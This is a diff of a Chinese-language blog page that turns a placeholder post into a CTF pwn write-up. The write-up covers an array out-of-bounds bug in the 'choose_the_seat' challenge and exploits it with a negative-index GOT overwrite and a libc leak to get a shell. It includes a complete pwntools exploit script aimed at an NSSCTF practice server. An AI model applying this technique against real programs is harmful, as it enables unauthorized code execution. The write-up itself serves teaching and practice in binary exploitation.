@@ -21,24 +21,27 @@
   <meta name="author" content="vstral">
   <meta name="keywords" content="pwn,vstral,ctf,computer,security,二进制,网络安全">
   
-    <meta name="description" content="测试1print(&quot;测试！！！&quot;)">
+    <meta name="description" content="一、作用数组越界读写是一类较为常见的漏洞，造成的原因在于对数组 二、例题分析choose_the_seat  程序仅仅检查了v0小于9，但是并没有检查输入值v0的正负 seats变量的位置是在bss区，我们可以通过改写got表来劫持控制流  第一次执行main函数因为vuln函数结尾有一个exit函数，所以可以通过改写exit的got表来使得重复执行main函数来实现多次改写控制，通过计算位置(0">
 <meta property="og:type" content="article">
-<meta property="og:title" content="new blog">
-<meta property="og:url" content="https://vstralcn.github.io/2025/03/16/new-blog/index.html">
+<meta property="og:title" content="vstral blog">
+<meta property="og:url" content="https://vstralcn.github.io/2025/03/16/%E3%80%90PWN%E3%80%91%E6%95%B0%E7%BB%84%E6%BA%A2%E5%87%BA%20%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99/index.html">
 <meta property="og:site_name" content="vstral blog">
-<meta property="og:description" content="测试1print(&quot;测试！！！&quot;)">
+<meta property="og:description" content="一、作用数组越界读写是一类较为常见的漏洞，造成的原因在于对数组 二、例题分析choose_the_seat  程序仅仅检查了v0小于9，但是并没有检查输入值v0的正负 seats变量的位置是在bss区，我们可以通过改写got表来劫持控制流  第一次执行main函数因为vuln函数结尾有一个exit函数，所以可以通过改写exit的got表来使得重复执行main函数来实现多次改写控制，通过计算位置(0">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/vstralcn/image/main/image-20250316210830825.png">
-<meta property="article:published_time" content="2025-03-16T11:14:15.000Z">
-<meta property="article:modified_time" content="2025-03-16T13:09:00.314Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/vstralcn/image/main/1737005471-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/vstralcn/image/main/1737005473-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/vstralcn/image/main/1737015389-image-1024x159.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/vstralcn/image/main/1737015870-image.png">
+<meta property="article:published_time" content="2025-03-16T14:21:40.640Z">
+<meta property="article:modified_time" content="2025-03-16T14:22:14.005Z">
 <meta property="article:author" content="vstral">
 <meta property="article:tag" content="pwn,vstral,ctf,computer,security,二进制,网络安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/vstralcn/image/main/image-20250316210830825.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/vstralcn/image/main/1737005471-image.png">
   
   
   
-  <title>new blog - vstral blog</title>
+  <title>vstral blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -204,7 +207,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="new blog"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -215,7 +218,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-16 19:14" pubdate>
+        <time datetime="2025-03-16 22:21" pubdate>
           2025年3月16日 晚上
         </time>
       </span>
@@ -227,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7 字
+          718 字
         
       </span>
     
@@ -238,7 +241,7 @@
         
         
         
-          1 分钟
+          6 分钟
         
       </span>
     
@@ -275,15 +278,31 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">new blog</h1>
+            <h1 id="seo-header"></h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;测试！！！&quot;</span>)<br></code></pre></td></tr></table></figure>
+                <h1 id="一、作用"><a href="#一、作用" class="headerlink" title="一、作用"></a>一、作用</h1><p>数组越界读写是一类较为常见的漏洞，造成的原因在于对数组</p>
+<h1 id="二、例题分析"><a href="#二、例题分析" class="headerlink" title="二、例题分析"></a>二、例题分析</h1><h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737005471-image.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737005473-image.png" srcset="/img/loading.gif" lazyload></p>
+<p>程序仅仅检查了v0小于9，但是并没有检查输入值v0的正负</p>
+<p>seats变量的位置是在bss区，我们可以通过改写got表来劫持控制流</p>
+<p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737015389-image-1024x159.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="第一次执行main函数"><a href="#第一次执行main函数" class="headerlink" title="第一次执行main函数"></a>第一次执行main函数</h3><p>因为vuln函数结尾有一个exit函数，所以可以通过改写exit的got表来使得重复执行main函数来实现多次改写控制，通过计算位置(0x404040 - 0x4040A0) &#x2F; 16&#x3D; -96 &#x2F; 16 &#x3D; -6</p>
+<p>所以可以通过第一次输入-6来控制read函数往exit的got表位置写入main函数的地址。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#第一次执行<span class="hljs-selector-tag">main</span><br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;-6&#x27;</span>) #覆盖exitGOT表为main函数使得能够重复执行<br>io<span class="hljs-selector-class">.sendline</span>(<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4012d1))<br></code></pre></td></tr></table></figure>
 
+<h3 id="第二次执行main函数"><a href="#第二次执行main函数" class="headerlink" title="第二次执行main函数"></a>第二次执行main函数</h3><p>第二次运行时候通过与第一次相似的计算可以将seat的地址指向read函数的got地址，然后puts函数就会输出read的地址，接收输出地址即可</p>
+<p><img src="https://raw.githubusercontent.com/vstralcn/image/main/1737015870-image.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#第二次执行<span class="hljs-selector-tag">main</span><br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;-7&#x27;</span>) #泄露read的got表地址<br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io<span class="hljs-selector-class">.send</span>(b<span class="hljs-string">&#x27;\xc0&#x27;</span>) #不能改变read的got地址<br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;name is &#x27;</span>)<br>read_got = <span class="hljs-built_in">u64</span>(io<span class="hljs-selector-class">.recv</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;read got &gt;&gt;&gt;&gt; &quot;</span> + hex(read_got)</span></span>) #输出read got地址<br><br>#计算system binsh地址<br>libcbase = read_got - libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span><br>system = libcbase + libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;system&#x27;</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;libcbase  &gt;&gt;&gt;&gt;  &quot;</span> + hex(libcbase)</span></span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/vstralcn/image/main/image-20250316210830825.png" srcset="/img/loading.gif" lazyload alt="image-20250316210830825"></p>
+<h3 id="第三次执行main函数"><a href="#第三次执行main函数" class="headerlink" title="第三次执行main函数"></a>第三次执行main函数</h3><p>将binsh写入并且改写puts地址为system函数获得shell</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#第三次执行<span class="hljs-selector-tag">main</span><br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;-9&#x27;</span>) #覆盖<br>io<span class="hljs-selector-class">.recvuntil</span>(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io<span class="hljs-selector-class">.sendline</span>(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-built_in">p64</span>(system))<br>io<span class="hljs-selector-class">.interactive</span>()<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br><span class="hljs-built_in">file</span> = <span class="hljs-string">&#x27;./vuln&#x27;</span><br><span class="hljs-comment">#io = process(file)</span><br>io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">23608</span>)<br>elf = ELF(<span class="hljs-built_in">file</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc =  ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-comment">#第一次执行main</span><br>io.recvuntil(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-6&#x27;</span>) <span class="hljs-comment">#覆盖exitGOT表为main函数使得能够重复执行</span><br>io.sendline(p64(<span class="hljs-number">0x4012d1</span>))<br><br><span class="hljs-comment">#第二次执行main</span><br>io.recvuntil(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-7&#x27;</span>) <span class="hljs-comment">#泄露read的got表地址</span><br>io.recvuntil(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.<span class="hljs-built_in">send</span>(b<span class="hljs-string">&#x27;\xc0&#x27;</span>)<br>io.recvuntil(b<span class="hljs-string">&#x27;name is &#x27;</span>)<br>read_got = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>print(<span class="hljs-string">&quot;read got &gt;&gt;&gt;&gt; &quot;</span> + hex(read_got)) <span class="hljs-comment">#输出read got地址</span><br><br><span class="hljs-comment">#计算system binsh地址</span><br>libcbase = read_got - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-keyword">system</span> = libcbase + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>print(<span class="hljs-string">&quot;libcbase  &gt;&gt;&gt;&gt;  &quot;</span> + hex(libcbase))<br><br><span class="hljs-comment">#第三次执行main</span><br>io.recvuntil(b<span class="hljs-string">&#x27;choose one.\n&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;-9&#x27;</span>) <span class="hljs-comment">#覆盖</span><br>io.recvuntil(b<span class="hljs-string">&#x27;name&#x27;</span>)<br>io.sendline(b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-keyword">system</span>))<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>在这道题过程中一直出了一个问题，一直打不通，经过了很长时间的检查才发现是（io.send(b’\xc0’)）这一步一开始写的sendline就会导致多发送一个\n导致read的GOT表被改写，从而导致libcbase计算错误，确实是不细心了</p>
 
                 
               </div>
@@ -301,8 +320,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>new blog</div>
-      <div>https://vstralcn.github.io/2025/03/16/new-blog/</div>
+      <div></div>
+      <div>https://vstralcn.github.io/2025/03/16/【PWN】数组溢出 越界读写/</div>
     </div>
     <div class="license-meta">
       
@@ -346,15 +365,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/16/hello-world/" title="Hello World">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Hello World</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2025/03/16/%E5%A0%86%E5%85%A5%E9%97%A8/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
